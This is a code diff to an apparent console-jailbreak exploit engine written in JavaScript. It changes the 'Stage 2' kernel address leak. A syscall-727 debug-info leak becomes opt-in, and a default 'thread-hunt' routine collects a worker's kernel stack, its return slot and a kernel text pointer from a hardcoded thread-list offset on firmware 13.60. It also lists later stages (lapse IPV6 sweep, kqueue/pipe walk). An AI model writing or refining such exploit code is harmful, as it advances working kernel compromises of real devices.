@@ -201,10 +201,12 @@ export function makeBagagwaEngine(X) {
         debugLeakBuf: null,
     };
 
-    // [OOM-fix] 727 leak config from the query string.
-    //   ?noleak=1     skip the 727 debug-info leak entirely (A/B test: if the
-    //                 "not enough free memory" dialog disappears with this,
-    //                 the leak call was the cause)
+    // [727-REMOVED] The 727 debug-info leak is OFF by default now — even the
+    // proven PSAITO shape still OOM'd on console. The replacement kernel
+    // address source is the THREAD-HUNT: worker_stack / returnAddressPtr,
+    // found via OFFSET_lk__thread_list (0x6C218, live-verified on 13.60)
+    // during prepare() — zero extra syscalls, zero extra memory.
+    //   ?leak727=1    re-enable the 727 debug-info leak (debugging only)
     //   ?leak=N       cap leak attempts (default LEAK_ATTEMPTS=16, each is
     //                 attempts x requests syscalls)
     //   ?leakshape=0|1
@@ -223,7 +225,7 @@ export function makeBagagwaEngine(X) {
             return m ? decodeURIComponent(m[1]) : dflt;
         } catch { return dflt; }
     }
-    const NO_LEAK = QP("noleak", "") === "1";
+    const NO_LEAK = QP("leak727", "") !== "1"; // 727 OFF unless explicitly re-enabled
     const LEAK_ATTEMPTS_EFF = Math.max(1, Math.min(LEAK_ATTEMPTS,
         parseInt(QP("leak", String(LEAK_ATTEMPTS)), 10) || LEAK_ATTEMPTS));
     const LEAK_SHAPE = (QP("leakshape", "0") === "1") ? 1 : 0;
@@ -1354,9 +1356,29 @@ export function makeBagagwaEngine(X) {
         note("=== Stage 2: kernel address leak ===");
 
         if (NO_LEAK) {
-            note("[727] DISABLED via ?noleak=1 — skipping debug-info leak entirely " +
-                "(pipe/lapse/waker routes only). A/B test: if the OOM dialog is " +
-                "gone with this flag, the leak call was the cause.");
+            // ===== [727-REMOVED] thread-hunt replacement leak =====
+            note("[leak] 727 disabled (default) — using THREAD-HUNT kernel addresses");
+            try {
+                if (P.kernelStack) {
+                    note("[leak] worker kernel stack = 0x" + P.kernelStack.toString(16) +
+                        " (from lk thread_list 0x6C218 @ prepare — free, no syscall)");
+                    S.leakedAddrs.push({ offset: 0, value: P.kernelStack, src: "thread-hunt-stack" });
+                }
+                if (P.returnAddressPtr) {
+                    note("[leak] worker return-slot = 0x" + P.returnAddressPtr.toString(16));
+                    S.leakedAddrs.push({ offset: 8, value: P.returnAddressPtr, src: "thread-hunt-ret" });
+                }
+                if (P.originalReturnAddress) {
+                    note("[leak] saved return addr = 0x" + P.originalReturnAddress.toString(16) +
+                        " (kernel text pointer — libkernel locality confirmed)");
+                    S.leakedAddrs.push({ offset: 16, value: P.originalReturnAddress, src: "thread-hunt-text" });
+                }
+                if (!P.kernelStack) note("[leak] thread-hunt addresses not exposed by prepare() (older main.js?)");
+            } catch (e) {
+                note("[leak] thread-hunt read failed: " + (e && e.message ? e.message : e));
+            }
+            note("[leak] ladder: waker decrement (handle-based, NO addresses) -> " +
+                "lapse IPV6 sweep -> kqueue/pipe walk in stage 4");
         } else if (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined || P.rawSyscall) {
             note("syscall 727 (0x2D7) " + (P.syscalls[SYS_GET_AIO_DEBUG_REQ_INFO] !== undefined
                 ? "stub available" : "called via RAW path (WebKit syscall;ret)") +
